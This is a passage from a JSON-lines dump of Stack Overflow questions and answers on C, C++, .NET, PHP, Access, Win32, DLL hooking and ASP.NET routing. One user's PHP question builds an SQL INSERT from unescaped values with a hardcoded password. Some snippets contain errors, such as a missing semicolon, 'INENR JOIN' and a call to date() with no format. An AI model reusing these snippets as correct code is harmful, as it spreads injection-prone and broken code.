PyImport_Import(pName);\n    Py_DECREF(pName);\n\n    if (pModule != NULL) {\n        pFunc = PyObject_GetAttrString(pModule, \"MyFunc\");\n        /* pFunc is a new reference */\n\n        if (pFunc) {\n            pArgs = PyTuple_New(0);\n            pArg = PyString_FromString(\"some parameter\")\n            /* pArg reference stolen here: */\n            PyTuple_SetItem(pArgs, 0, pArg);\n            pResult = PyObject_CallObject(pFunc, pArgs);\n            Py_DECREF(pArgs);\n            if (pResult != NULL) {\n                printf(\"Result of call: %s\\n\", PyString_AsString(pResult));\n                Py_DECREF(pResult);\n            }\n            else {\n                Py_DECREF(pFunc);\n                Py_DECREF(pModule);\n                PyErr_Print();\n                fprintf(stderr,\"Call failed\\n\");\n                return 1;\n            }\n        }\n        else {\n            if (PyErr_Occurred())\n                PyErr_Print();\n            fprintf(stderr, \"Cannot find function\");\n        }\n        Py_XDECREF(pFunc);\n        Py_DECREF(pModule);\n    }\n    else {\n        PyErr_Print();\n        fprintf(stderr, \"Failed to load module\");\n        return 1;\n    }\n    Py_Finalize();\n    return 0;\n}\n\n", "score": 10}
{"title": "Which built-in .NET exceptions can I throw from my application?", "description": "If I need to throw an exception from within my application which of the built-in .NET exception classes can I use? Are they all fair game? When should I derive my own?\n", "answer": "See Creating and Throwing Exceptions.\nOn throwing built-in exceptions, it says:\n\nDo not throw System.Exception, System.SystemException, System.NullReferenceException, or System.IndexOutOfRangeException intentionally from your own source code.\n\nand\n\nDo Not Throw General Exceptions \nIf you throw a general exception type, such as Exception or SystemException in a library or framework, it forces consumers to catch all exceptions, including unknown exceptions that they do not know how to handle. \nInstead, either throw a more derived type that already exists in the framework, or create your own type that derives from Exception.\"\n\nThis blog entry also has some useful guidelines.\nAlso, FxCop code analysis defines a list of \"do not raise exceptions\" as described here.  It recommends:\n\nThe following exception types are too general to provide sufficient information to the user: \n\nSystem.Exception \nSystem.ApplicationException \nSystem.SystemException\n\nThe following exception types are reserved and should be thrown only by the common language runtime: \n\nSystem.ExecutionEngineException \nSystem.IndexOutOfRangeException \nSystem.NullReferenceException \nSystem.OutOfMemoryException\n\nSo in theory you can raise any other framework exception type, providing you clearly understand the intent of the exception as described by Microsoft (see MSDN documentation).\nNote, these are \"guidelines\" and as some others have said, there is debate around System.IndexOutOfRangeException (ie many developers throw this exception).\n", "score": 50}
{"title": "Detect Keyboard Event in C", "description": "How can I detect keyboard event in C language without using third party libraries? Should I use signal handling?\n", "answer": "There's not a standard way, but these should get you started.\nWindows:\ngetch();\n\nUnix:\nUse this code from W. Richard Stevens' Unix Programming book to set your terminal in raw mode, and then use read().\nstatic struct termios   save_termios;\nstatic int              term_saved;\n\nint tty_raw(int fd) {       /* RAW! mode */\n    struct termios  buf;\n\n    if (tcgetattr(fd, &save_termios) < 0) /* get the original state */\n        return -1;\n\n    buf = save_termios;\n\n    buf.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);\n                    /* echo off, canonical mode off, extended input\n                       processing off, signal chars off */\n\n    buf.c_iflag &= ~(BRKINT | ICRNL | ISTRIP | IXON);\n                    /* no SIGINT on BREAK, CR-toNL off, input parity\n                       check off, don't strip the 8th bit on input,\n                       ouput flow control off */\n\n    buf.c_cflag &= ~(CSIZE | PARENB);\n                    /* clear size bits, parity checking off */\n\n    buf.c_cflag |= CS8;\n                    /* set 8 bits/char */\n\n    buf.c_oflag &= ~(OPOST);\n                    /* output processing off */\n\n    buf.c_cc[VMIN] = 1;  /* 1 byte at a time */\n    buf.c_cc[VTIME] = 0; /* no timer on input */\n\n    if (tcsetattr(fd, TCSAFLUSH, &buf) < 0)\n        return -1;\n\n    term_saved = 1;\n\n    return 0;\n}\n\nint tty_reset(int fd) { /* set it to normal! */\n    if (term_saved)\n        if (tcsetattr(fd, TCSAFLUSH, &save_termios) < 0)\n            return -1;\n\n    return 0;\n}\n\n", "score": 11}
{"title": "How to intercept dll method calls?", "description": "How to intercept dll method calls?\n\nWhat are the techniques available for it?\nCan it be done only in C/C++?\nHow to intercept method calls from all running processes to a given dll?\nHow to intercept method calls from a given processes to a given dll?\n\n", "answer": "There are two standard ways I can think of for doing this\n\nDLL import table hook.\nFor this you need to parse the PE Header of the DLL, find the import table and write the address of your own function instead of what is already written there. You can save the address of the original function to be able to call it later. The references in the external links of this wikipedia article should give you all the information you need to be able to do this.\nDirect modification of the code. Find the actual code of the function you want to hook and modify the first opcodes of it to jump to your own code. you need to save the opcode which were there so they will eventually get executed. This is simpler than it sounds mostly because it was already implement by no less than Microsoft themselves in the form of the Detours library.\nThis is a really neat thing to do. with just a couple of lines of code you can for instance replace all calls to GetSystemMetrics() from say outlook.exe and watch the wonders that occur.\n\nThe advantages of one method are the disadvantages of the other. The first method allows you to add a surgical hook exactly to DLL you want where all other DLLs go by unhooked. The second method allows you the most global kind of hook to intercept all calls do the function.\n", "score": 12}
{"title": "Javascript and PHP functions", "description": "Is it possible to call a function from PHP using onsubmit from JavaScript? If so could someone give me an example of how it would be done?\nfunction addOrder(){\n    $con = mysql_connect(\"localhost\", \"146687\", \"password\");\n    if(!$con){\n        die('Could not connect: ' . mysql_error())\n    }\n\n    $sql = \"INSERT INTO orders ((user, 1st row, 2nd row, 3rd row, 4th row)\n    VALUES ($session->username,1st variable, 2nd variable, 3rd variable, 4th variable))\";\n\n    mysql_query($sql,$con)\n    if(mysql_query($sql,$con)){\n        echo \"Your order has been added\";\n    }else{\n        echo \"There was an error adding your order to the databse: \" . mysql_error();\n    }\n}\n\nThat's the function I am wanting to call. Its an ordering system, you type in how much of each item you want, hit submit and it should add the order to the table.\n", "answer": "You can not call a PHP function from Javascript...\nJavascript is a client language (it's executed on the Web browser, after receiving the web page) while PHP is on the server side (it's executed before the web page is rendered). You have no way to make one call another.\n...but you can get the result of an external PHP script\nThere is a Javascript function called xhttprequest that allows you to call any script on the Web server and get its answer. So to solve your problem, you can create a PHP script that outputs some text (or XML, or JSON), then call it, and you analyze the answer with Javascript.\nThis process is what we call AJAX, and it's far easier to do it with a good tool than yourself. Have a look to JQuery, it's powerful yet easy to use Javascript library that has built-in AJAX helpers.\nAn example with JQuery (client side) :\n$.ajax({\n   type: \"POST\", // the request type. You most likely going to use POST\n   url: \"your_php_script.php\", // the script path on the server side\n   data: \"name=John&location=Boston\", // here you put you http param you want to be able to retrieve in $_POST \n   success: function(msg) {\n     alert( \"Data Saved: \" + msg ); // what you do once the request is completed\n   }\n\n", "score": 20}
{"title": "What is best practice for this problem (different properties for different categories)?", "description": "I have some products that belongs to the some category.\nEach category can have different properties.\nFor example, \n\ncategory cars has properties color,\npower, ... \ncategory pets have properties  weight, age, ...\n\nNumber of categories is about 10-15.\nNumber of properties in each category is 3-15.\nNumber of products is very big.\nMain requirement for this app is very good search. We will select category, and enter criteria for each property in this category.\nHave to design database for this scenario. (SQL Server 2005)\n", "answer": "The classic design approach would be (the star denotes the primary key column):\nProduct\n  ProductId*\n  CategoryId: FK to Category.CategroyId\n  Name\n\nCategory\n  CategoryId*\n  Name\n\nProperty\n  PropertyId*\n  Name\n  Type\n\nCategoryProperty\n  CategoryId*: FK to Category.CategoryId\n  PropertyId*: FK to Property.PropertyId\n\nProductProperty\n  ProductId*: FK to Product.ProductId\n  PropertyId*: FK to Property.PropertyId\n  ValueAsString\n\nIf you can live with the fact that every property value would go to the DB as a string and type conversion info is stored in the Property table, this layout would be enough.\nThe query would go something like this:\nSELECT\n   Product.ProductId,\n   Product.Name AS ProductName,\n   Category.CategoryId,\n   Category.Name AS CategoryName,\n   Property.PropertyId,\n   Property.Name AS PropertyName,\n   Property.Type AS PropertyType,\n   ProductProperty.ValueAsString\nFROM\n   Product \n   INNER JOIN Category         ON Category.CategoryId = Product.CategoryId\n   INENR JOIN CategoryProperty ON CategoryProperty.CategoryId = Category.CategoryId\n   INNER JOIN Property         ON Property.PropertyId = CategoryProperty.PropertyId\n   INNER JOIN ProductProperty  ON ProductProperty.PropertyId = Property.PropertyId\n                                  AND ProductProperty.ProductId = Product.ProductId\nWHERE\n   Product.ProductId = 1\n\nThe more WHERE conditions you supply (conjunctively, e.g. using AND), the faster the query will be. If you have properly indexed your tables, that is. \nAs it is, the solution is not ideal for a full text indexing situation. An additional table that stores all the text associated with a ProductId in a more denormalized way could help here. This table would need updating through triggers that listen for changes in the ProductProperty table.\n", "score": 16}
{"title": "What do I need to know about Unicode?", "description": "Being a application developer, do I need to know Unicode?\n", "answer": "Unicode is a standard that defines numeric codes for glyphs used in written communication. Or, as they say it themselves:\n\nThe standard for digital\n  representation of the characters used\n  in writing all of the world's\n  languages. Unicode provides a uniform\n  means for storing, searching, and\n  interchanging text in any language. It\n  is used by all modern computers and is\n  the foundation for processing text on\n  the Internet. Unicode is developed and\n  maintained by the Unicode Consortium.\n\nThere are many common, yet easily avoided, programming errors committed by developers who don't bother to educate themselves about Unicode and its encodings.\n\nFirst, go to the source for\nauthoritative, detailed information\nand implementation guidelines.\nAs mentioned by others, Joel Spolsky\nhas a good list of these\nerrors.\nI also like Elliotte Rusty Harold's\nTen Commandments of Unicode.\nDevelopers should also watch out for\ncanonical representation attacks.\n\nSome of the key concepts you should be aware of are:\n\nGlyphs—concrete graphics used to represent written characters.\nComposition—combining glyphs to create another glyph.\nEncoding—converting Unicode points to a stream of bytes.\nCollation—locale-sensitive comparison of Unicode strings.\n\n", "score": 45}
{"title": "How can I extract XML of a website and save in a file using Perl's LWP?", "description": "How can I extract information from a website (http://tv.yahoo.com/listings)  and then create an XML file out of it? I want to save it so  to parse later and display information using JavaScript?\nI am quite new to Perl and I have no idea about how to do it.\n", "answer": "Of course. The easiest way would be the Web::Scraper module. What it does is it lets you define scraper objects that consist of\n\nhash key names,\nXPath expressions that locate elements of interest,\nand code to extract bits of data from them.\n\nScraper objects take a URL and return a hash of the extracted data. The extractor code for each key can itself be another scraper object, if necessary, so that you can define how to scrape repeated compound page elements: provide the XPath to find the compound element in an outer scraper, then provide a bunch more XPaths to pull out its individual bits in an inner scraper. The result is then automatically a nested data structure.\nIn short, you can very elegantly suck data from all over a page into a Perl data structure. In doing so, the full power of XPath + Perl is available for use against any page. Since the page is parsed with HTML::TreeBuilder, it does not matter how nasty a tagsoup it is. The resulting scraper scripts are much easier to maintain and far more tolerant of minor markup variations than regex-based scrapers.\nBad news: as yet, its documentation is almost non-existent, so you have to get by with googling for something like [miyagawa web::scraper] to find example scripts posted by the module’s author.\n", "score": 11}
{"title": "WordPress Admin Plugin", "description": "I'm wondering how I can make a plugin to output some data via the admin panel.\nJust to get me going what code would make a page in the admin panel (for only administrators) to display time()?\n", "answer": "It's actually very easy, you only need two things:\n\nOne of many tutorials on writing a Wordpress plugin. Plugins subscribe to actions (amongst other things) and can emit HTML when an action is triggered by the Wordpress engine.\nThe list on the Wordpress codex of actions to which plugins can subscribe to trigger their own code. Adding actions is defined in that tutorial. Specifically you want the administrative actions. e.g.: the admin_footer action will cause your plugin's output to be displayed in the footer of the admin page. There's a wide range of actions for all kinds of situations and conditions.\n\nThe PHP date() function will give you the current time, so you just need to write a function in your plugin that does echo date(), and then use add_action to get your PHP function executed in response to the appropriate Wordpress action.\nSo to make it completely clear, your plugin code would look like this (not tested!):\n/*\nPlugin Name: Admin Date Displayer\nPlugin URI: http://example.com/\nDescription: Displays the current datetime on the admin page\nAuthor: Stewart\nVersion: 1.0\nAuthor URI: http://bolidian.com/\n*/\n\nfunction display_date()\n{\n    echo date();\n}\n\nadd_action('admin_footer', 'display_date');\n\n", "score": 11}
{"title": "How can I specify a font for a window created through CreateWindow?", "description": "I'm creating window using pure Win32 API (RegisterClass and CreateWindow functions). How can I specify a font for the window instead of system defined one?\n", "answer": "When you create your own window class, you are responsible for managing the font yourself.  This task will have four parts:\n\nWhen the window is created (i.e. when you handle WM_CREATE), use CreateFont() or CreateFontIndirect() to obtain an HFONT for the font you want to use in the window.  You will need to store this HFONT along with the other data you keep for each instance of the window class.  You may choose to have your window class handle WM_GETFONT and WM_SETFONT as well, but it is generally not required for top-level windows (if you are creating a control window class, you will want to handle WM_SETFONT, since the dialog manager sends that message).\nIf your window has any child windows that contain text, send each of them a WM_SETFONT message whenever your window's font changes.  All of the common Windows controls handle WM_SETFONT.\nWhen you draw the contents of your window (typically in response to a WM_PAINT message), select your HFONT into the device context with the SelectObject() function before drawing text (or using text functions such as or GetTextMetrics()).\nWhen the window is destroyed (i.e. when you handle WM_DESTROY), use DeleteObject() to release the font you created in step 1.  Note that if you choose to handle WM_SETFONT in your window, do not delete a font object you receive in your WM_SETFONT handler, as the code that sent the message expects to retain ownership of that handle.\n\n", "score": 17}
{"title": "declare JSP taglib directives in web.xml", "description": "I seem to remember reading that it's possible to declare taglib directives such as:\n<%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\" %>\n\nin web.xml. This eliminates the need to duplicate this directive in every JSP file where the taglib is used. Could someone tell me how these directives can be added to web.xml?\n", "answer": "The taglib element in web.xml serves a different purpose to the taglib directive which you have above.\nAs David said, the taglib directive is required on each page.\nIf you have many pages which use common taglibs, you can shortcut this by putting the taglib directives into an include file, and including this file each page. But no matter how you do it, the taglib directive has to be on the page somehow.\nThat tag you need to include on each page looks like this:\n<%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\" %>\n\nIf you have a custom taglib in a custom location, you can also specify a location relative to the webapp root:\n <%@ taglib prefix=\"ex\" uri=\"/taglib.tld\" %>\n\nFurther reading on the taglib directive\nThe taglib directive from web.xml maps tag uris to the physical location of your taglib. It is optional since JSP 2.0, as compliant containers will look in a set of standard locations to try to auto-discover the taglib: /WEB-INF and its subdirectories, /META-INF as well for JAR files.\nIt looks like this, in web.xml:\n<taglib>\n  <taglib-uri>\n    http://www.example.com/taglib\n  </taglib-uri>\n  <taglib-location>\n    /taglib.tld\n  </taglib-location>\n</taglib>\n\nAnd the taglib is referenced in the JSP page like this (the taglib directive on each page is unavoidable!):\n<%@ taglib prefix=\"ex\" uri=\"http://www.example.com/taglib\" %>\n\nThis is equivalent to the second example I gave for the taglib directive above. The biggest difference is in how you point to the taglib location. \nThis page contains a bit more information.\n", "score": 27}
{"title": "What are \"ForwardedTypes\" in the context of Castle Windsor component registration?", "description": "As the subject says, really!  What do they do?\n", "answer": "Forwarded types allow you to have more than one service implemented by a single implementation, for a concrete example say we have two interfaces for working with tree nodes of some sort:\npublic interface INodeAlterationProvider { ... }\npublic interface IChildNodeListProvider { ... }\n\nAnd various components take a dependency on one or both of those interfaces.  However in implementing each of those interfaces you discover that their is a lot of shared functionality and want to merge the implementations into a single class along with some other features say like:\npublic class NodeFactory : INodeAlterationProvider, IChildNodeListProvider { ... }\n\nYou could register two instances of NodeFactory, one for each service they implement:\ncontainer.Register(Component.For<INodeAlterationProvider>().ImplementedBy<NodeFactory>());\ncontainer.Register(Component.For<IChildNodeListProvider>().ImplementedBy<NodeFactory>());\n\nBut this could potentially mean two singleton instances of NodeFactory exist - not ideal, especially if it's costly to construct - and can make debugging etc. harder to understand, especially if there was more than two interfaces being implemented.\nThis is where forwarded types step in, allowing you to forward multiple services to the same implementation, here's an example of doing that:\ncontainer.Register(Component.For<INodeAlterationProvider>().Forward<IChildNodeListProvider>().ImplementedBy<NodeFactory>());\n\nNote: the component registration code shown here is only available on trunk.\n", "score": 19}
{"title": "What is the difference between these declarations in C?", "description": "In C and C++ what do the following declarations do?\nconst int * i;\nint * const i;\nconst volatile int ip;\nconst int *i;\n\nAre any of the above declarations wrong?\nIf not what is the meaning and differences between them?\nWhat are the useful uses of above declarations (I mean in which situation we have to use them in C/C++/embedded C)?\n", "answer": "const int * i;\ni is a pointer to constant integer.  i can be changed to point to a different value, but the value being pointed to by i can not be changed.\nint * const i;\ni is a constant pointer to a non-constant integer.  The value pointed to by i can be changed, but i cannot be changed to point to a different value.\nconst volatile int ip;\nThis one is kind of tricky.  The fact that ip is const means that the compiler will not let you change the value of ip.  However, it could still be modified in theory, e.g. by taking its address and using the const_cast operator.  This is very dangerous and not a good idea, but it is allowed.  The volatile qualifier indicates that any time ip is accessed, it should always be reloaded from memory, i.e. it should NOT be cached in a register.  This prevents the compiler from making certain optimizations.  You want to use the volatile qualifier when you have a variable which might be modified by another thread, or if you're using memory-mapped I/O, or other similar situations which could cause behavior the compiler might not be expecting.  Using const and volatile on the same variable is rather unusual (but legal) -- you'll usually see one but not the other.\nconst int *i;\nThis is the same as the first declaration.\n", "score": 34}
{"title": "Does MS access(2003) have anything comparable to Stored procedure. I want to run a complex query in MS acceess", "description": "I have a table, call it TBL. It has two columns,call them A and B. Now in the query I require one column as A and other column should be a comma seprated list of all B's which are against A in TBL. \ne.g. TBL is like this\n1   Alpha\n2   Beta\n1   Gamma\n1   Delta\nResult of query should be \n1   Alpha,Gamma,Delta\n2   Beta\nThis type of thing is very easy to do with cursors in stored procedure. But I am not able to do it through MS Access, because apparently it does not support stored procedures. \nIs there a way to run stored procedure in MS access? or is there a way through SQL to run this type of query\n", "answer": "You can concatenate the records with a User Defined Function (UDF).\nThe code below can be pasted 'as is' into a standard module. The SQL for you example would be:\nSELECT tbl.A, Concatenate(\"SELECT B  FROM tbl\n        WHERE A = \" & [A]) AS ConcA\nFROM tbl\nGROUP BY tbl.A\n\nThis code is by DHookom, Access MVP, and is taken from http://www.tek-tips.com/faqs.cfm?fid=4233\nFunction Concatenate(pstrSQL As String, _\n        Optional pstrDelim As String = \", \") _\n            As String\n    'example\n    'tblFamily with FamID as numeric primary key\n    'tblFamMem with FamID, FirstName, DOB,...\n    'return a comma separated list of FirstNames\n    'for a FamID\n    '    John, Mary, Susan\n    'in a Query\n    '(This SQL statement assumes FamID is numeric)\n    '===================================\n    'SELECT FamID,\n    'Concatenate(\"SELECT FirstName FROM tblFamMem\n    '     WHERE FamID =\" & [FamID]) as FirstNames\n    'FROM tblFamily\n    '===================================\n    '\n    'If the FamID is a string then the SQL would be\n    '===================================\n    'SELECT FamID,\n    'Concatenate(\"SELECT FirstName FROM tblFamMem\n    '     WHERE FamID =\"\"\" & [FamID] & \"\"\"\") as FirstNames\n    'FROM tblFamily\n    '===================================\n\n    '======For DAO uncomment next 4 lines=======\n    '======     comment out ADO below    =======\n    'Dim db As DAO.Database\n    'Dim rs As DAO.Recordset\n    'Set db = CurrentDb\n    'Set rs = db.OpenRecordset(pstrSQL)\n\n    '======For ADO uncomment next two lines=====\n    '======     comment out DAO above     ======\n    Dim rs As New ADODB.Recordset\n    rs.Open pstrSQL, CurrentProject.Connection, _\n            adOpenKeyset, adLockOptimistic\n    Dim strConcat As String 'build return string\n    With rs\n        If Not .EOF Then\n            .MoveFirst\n            Do While Not .EOF\n                strConcat = strConcat & _\n                    .Fields(0) & pstrDelim\n                .MoveNext\n            Loop\n        End If\n        .Close\n    End With\n    Set rs = Nothing\n    '====== uncomment next line for DAO ========\n    'Set db = Nothing\n    If Len(strConcat) > 0 Then\n        strConcat = Left(strConcat, _\n            Len(strConcat) - Len(pstrDelim))\n    End If\n    Concatenate = strConcat\nEnd Function \n\n", "score": 11}
{"title": "How to make consistent dll binaries across VS versions?", "description": "For instance, winsock libs works great across all versions of the visual studio. But I am having real trouble to provide a consistent binary across all the versions. The dll compiled with VS 2005 won't work when linked to an application written in 2008. I upgraded both 2k5 and 2k8 to SP1, but the results haven't changed much. It works some what ok. But when they include this with a C# app, the C# app gets access violation errors, but with classic C++ application it works fine.\nIs there a strategy that I should know when I provide dlls ?\n", "answer": "First, dont pass anything other than plain old data accross DLL boundries. i.e. structs are fine. classes are not.\nSecond, make sure that ownership is not transferred - i.e. any structs passed accross the dll boundry are never deallocated outside the dll. So, if you dll exports a X* GetX() function, there is a corresponding FreeX(X*) type function ensuring that the same runtime that allocated is responsible for de-allocation.\nNext: Get your DLLs to link to the static runtime. Putting together a project comprimising dls from several 3rd parties, each linked to and expecting different runtimes, potentially different to the runtime expected by the app, is a pain, potentially forcing the installer software to install runtimes for 7.0, 7.1, 8.0 and 9.0 - several of which exist in different service packs which may or may not cause issues. Be kind - statically link your dll projects.\n-- Edit:\nYou cannot export a c++ class directly with this approach. Sharing class definitions between modules means you MUST have a homogeneous runtime environment as different compilers or versions of compilers will generate decorated names differently.\nYou can bypass this restriction by exporting your class instead as a COM style interface... which is to say, while you cannot export a class in a runtime independent way, you CAN export an \"interface\", which you can easilly make by declaring a class containing only pure virtual functions...\n  struct IExportedMethods {\n    virtual long __stdcall AMethod(void)=0;\n  };\n  // with the win32 macros:\n  interface IExportedMethods {\n    STDMETHOD_(long,AMethod)(THIS)PURE;\n  };\n\nIn your class definition, you inherit from this interface:\n  class CMyObject: public IExportedMethods { ...\n\nYou can export interfaces like this by making C factory methods:\n  extern \"C\" __declspec(dllexport) IExportedClass* WINAPI CreateMyExportedObject(){\n    return new CMyObject; \n  }\n\nThis is a very lightweight way of exporting compiler version and runtime independent class versions. Note that you still cannot delete one of these. You Must include a release function as a member of the dll or the interface. As a member of the interface it could look like this:\n  interface IExportedMethods {\n    STDMETHOD_(void) Release(THIS) PURE; };\n  class CMyObject : public IExportedMethods {\n    STDMETHODIMP_(void) Release(){\n      delete this;\n    }\n  };\n\nYou can take this idea and run further with it - inherit your interface from IUnknown, implement ref counted AddRef and Release methods as well as the ability to QueryInterface for v2 interfaces or other features. And finally, use DllCreateClassObject as the means to create your object and get the necessary COM registration going. All this is optional however, you can easilly get away with a simple interface definition accessed through a C function.\n", "score": 12}
{"title": "how to implement shortcut key combination of CTRL or SHIFT +  through javascript?", "description": "ASP.NET 2.0 web application, how to implement shortcut key combination of CTRL + Letter, preferably through JavaScript, to make web application ergonomically better? How to capture multiple-key keyboard events through JavaScript?\n", "answer": "The short answer is that you use Javascript to capture a keydown event and use that event to fire off a function.\nRelevant articles:\n\nhttp://www.openjs.com/scripts/events/keyboard_shortcuts/\nhttp://udayms.wordpress.com/2006/03/17/ajax-key-disabling-using-javascript/\nhttp://protocolsofmatrix.blogspot.com/2007/09/javascript-keycode-reference-table-for.html\nhttp://www.quirksmode.org/js/keys.html\n\nIf you're using the jQuery library, I'd suggest you look at the HotKeys plugin for a cross-browser solution.\n\nI know this is not answering the orginal question, but here is my advice: Don't Use Key Combination Shortcuts In A Web Application!\nWhy? Because it might break de the usability, instead of increasing it. While it's generally accepted that \"one-key shortcut\" are not used in common browsers (Opera remove it as default from its last major version), you cannot figure out what are, nor what will be, the key combination shortcuts used by various browser.\n\nGizmo makes a good point. There's some information about commonly-used accesskey assignments at http://www.clagnut.com/blog/193/. \nIf you do change the accesskeys, here are some articles with good suggestions for how to do it well:\n\nAccesskeys: Unlocking Hidden Navigation\nUsing accesskey attribute in HTML forms and links \n\nAnd you may find this page of Firefox's default Keyboard and Mouse Shortcuts useful (Another version of same information). Keyboard shortcuts for Internet Explorer 7 and Internet Explorer 6. Keyboard shortcuts for Opera and Safari.\nYou're more likely to run into problems with JAWS or other screen readers that add more keyboard shortcuts.\n", "score": 10}
{"title": "Unmanaged DLLs in C++", "description": "I've been reading many a tutorial/article on unmanaged DLLs in C++. For the life of me, however, I cannot seem to grasp the concept. I'm easily confused by the seeming disagreement about whether it needs a header file, how to export it, whether I need a .lib file and what have you.\nSo, let's assume I have just a function like so:\npublic int calculateSquare(int num)\n{\n    return num*num;\n}\n\nIgnoring the actual code, what do I require to make this simple function, by itself, into a DLL which I can then call? Do I just add __dllexport or whatever it is to the first line or do I require a header? I am perplexed by all of this.\n", "answer": "I cannot stress this enough, the C++ compiler does not see header files, after the preprocessor is done, there's just one big source file ( also called the compilation unit ). So strictly you don't need a header to export this function from a dll.\nWhat you do need is some form of conditional compilation to export the function in the dll that you are compiling and to import it in the client code.\nTypically this is done with a combination of macros and header files. You create a macro called MYIMPORTEXPORT and through the use of macro conditional statements you make it work like __declspec ( dllexport ) in the dll, and __declspec( dllimport ) in the client code.\nin file MYIMPORTEXPORT.h\n#ifdef SOME_CONDITION\n#define MYIMPORTEXPORT __declspec( dllexport )\n#else\n#define MYIMPORTEXPORT __declspec( dllimport )\n#endif\n\nin file MyHeader.h\n#include <MyImportExport.h>\n\nMYIMPORTEXPORT public int calculateSquare(int num)\n{\n    return num*num;\n}\n\nin dll .cpp file\n#define SOME_CONDITION\n\n#include <MyHeader.h>\n\nin client code .cpp file\n#include <MyHeader.h>\n\nOf course you also need to signal to the linker that you are building a dll with the /DLL option.\nThe build process will also make a .lib file, this is a static lib - called the stub in this case - which the client code needs to link to as if it were linking to a real static lib. Automagically, the dll will be loaded when the client code is run. Of course the dll needs to be found by the OS through its lookup mechanism, which means you cannot put the dll just anywhere, but in a specific location. Here is more on that.\nA very handy tool to see whether you exported the correct function from the dll, and whether the client code is correctly importing is dumpbin. Run it with /EXPORTS and /IMPORTS respectively.\n", "score": 15}
{"title": "ASP.Net MVC - handling bad URL parameters", "description": "What's the best way to handle a visitor constructing their own URL and replacing what we expect to be an ID with anything they like?\nFor example:\nASP.Net MVC - handling bad URL parameters\nBut the user could just as easily replace the URL with:\nhttps://stackoverflow.com/questions/foo\nI've thought of making every Controller Function parameter a String, and using Integer.TryParse() on them - if that passes then I have an ID and can continue, otherwise I can redirect the user to an Unknown / not-found or index View.\nStack Overflow handles it nicely, and I'd like to too - how do you do it, or what would you suggest?\n", "answer": "Here's an example of a route like yours, with a constraint on the number:\nroutes.MapRoute(\n    \"Question\",\n    \"questions/{questionID}\",\n    new { controller = \"StackOverflow\", action = \"Question\" },\n    new { questionID = @\"\\d+\" } //Regex constraint specifying that it must be a number.\n);\n\nHere we set the questionID to have at least one number. This will also block out any urls containing anything but an integer, and also prevents the need for a nullable int.\nNote: This does not take into account numbers that larger than the range of Int32 (-2147483647 - +2147483647). I leave this as an exercise to the user to resolve. :)\nIf the user enters the url \"questions/foo\", they will not hit the Question action, and fall through it, because it fails the parameter constraint. You can handle it further down in a catchall/default route if you want:\nroutes.MapRoute(\n    \"Catchall\",\n    \"{*catchall}\", // This is a wildcard routes\n    new { controller = \"Home\", action = \"Lost\" }\n);\n\nThis will send the user to the Lost action in the Home controller. More information on the wildcard can be found here.\nNB: The Catchall should reside as the LAST route. Placing it further up the chain will mean that this will handle all others below it, given the lazy nature of routes in ASP.NET MVC.\n", "score": 12}
{"title": "C++ two or more data types in declaration", "description": "I'm getting a strange error from g++ 3.3 in the following code:\n#include <bitset>\n#include <string>\n\nusing namespace std;\n\ntemplate <int N, int M>\nbitset<N> slice_bitset(const bitset<M> &original, size_t start) {\n    string str = original.to_string<char, char_traits<char>, allocator<char> >();\n    string newstr = str.substr(start, N);\n    return bitset<N>(newstr);\n}\n\nint main() {\n    bitset<128> test;\n    bitset<12> result = slice_bitset<12, 128>(test, 0);\n    return 0;\n}\n\nThe error is as follows:\n\nIn function `std::bitset slice_bitset(const std::bitset&, unsigned int)':\nsyntax error before `,' token\n`char_traits' specified as declarator-id\ntwo or more data types in declaration of `char_traits'\n`allocator' specified as declarator-id\ntwo or more data types in declaration of `allocator'\nsyntax error before `>' token\n\nIt has to be something really silly, but I've already told it to my rubber duck and a friend to no avail.\nThanks, Lazyweb.\n", "answer": "The selected answer from CAdaker solves the problem, but does not explain why it solves the problem.\nWhen a function template is being parsed, lookup does not take place in dependent types.  As a result, constructs such as the following can be parsed:\ntemplate <typename T>\nclass B;\n\ntemplate <typename T>\nvoid foo (B<T> & b) {\n  // Use 'b' here, even though 'B' not defined\n}\n\ntemplate <typename T>\nclass B\n{\n  // Define 'B' here.\n};\n\nHowever, this \"feature\" has a cost, and in this case it is that the definition of 'foo' requires hints on the contents of the template 'B'.  If 'foo' uses a nested type of 'B', then the typename keyword is required to tell the compiler that the name is a type:\ntemplate <typename T>\nvoid foo (B<T> & b)\n{\n  typename B<T>::X t1;    // 'X' is a type - this declares t1\n  B<T>::Y * t1;           // 'Y' is an object - this is multiplication\n}\n\nWithout 'typename' in the above the compiler will assume that X is an object (or function).\nSimilarly, if a member function is called and the call has explicit template arguments then the compiler needs to know to treat the < as the start of a template argument list and not the less than operator:\ntemplate <typename T>\nvoid foo (B<T> & b)\n{\n  b.template bar<int> (0); // 'bar' is a template, '<' is start of arg list\n  b.Y < 10;                // 'Y' is an object, '<' is less than operator\n}\n\nWithout template, the compiler assumes that < is the less than operator, and so generates the syntax error when it sees int> since that is not an expression.\nThese hints are required even when the definition of the template is visible.  The reason is that an explicit specialization might later change the definition that is actually chosen:\ntemplate <typename T>\nclass B\n{\n  template <typename S>\n  void a();\n};\n\ntemplate <typename T>\nvoid foo (B<T> & b)\n{\n  b.a < 10;            // 'B<int>::a' is a member object\n}\n\ntemplate <>\nclass B<int>\n{\n  int a;\n};\n\n", "score": 10}
{"title": "Long strings with newlines", "description": "I have seen C# code that uses the @ to tell the compiler the string has newlines in it and that it should be all in one line.\nIs there something like that for C/C++?\nLike if I want to put something like:\n73167176531330624919225119674426574742355349194934\n96983520312774506326239578318016984801869478851843\n85861560789112949495459501737958331952853208805511\n12540698747158523863050715693290963295227443043557\n66896648950445244523161731856403098711121722383113\n62229893423380308135336276614282806444486645238749\n30358907296290491560440772390713810515859307960866\n70172427121883998797908792274921901699720888093776\n65727333001053367881220235421809751254540594752243\n52584907711670556013604839586446706324415722155397\n53697817977846174064955149290862569321978468622482\n83972241375657056057490261407972968652414535100474\n82166370484403199890008895243450658541227588666881\n16427171479924442928230863465674813919123162824586\n17866458359124566529476545682848912883142607690042\n24219022671055626321111109370544217506941658960408\n07198403850962455444362981230987879927244284909188\n84580156166097919133875499200524063689912560717606\n05886116467109405077541002256983155200055935729725\n71636269561882670428252483600823257530420752963450\nIn a string I don't want to place it all in one line but just put it like that and have the compiler know that that is only one line.\n", "answer": "C and C++ didn't have anything like C# verbatim string literals at the time this answer was first written. The closest you could do is:\n\"73167176531330624919225119674426574742355349194934\"\n\"96983520312774506326239578318016984801869478851843\" 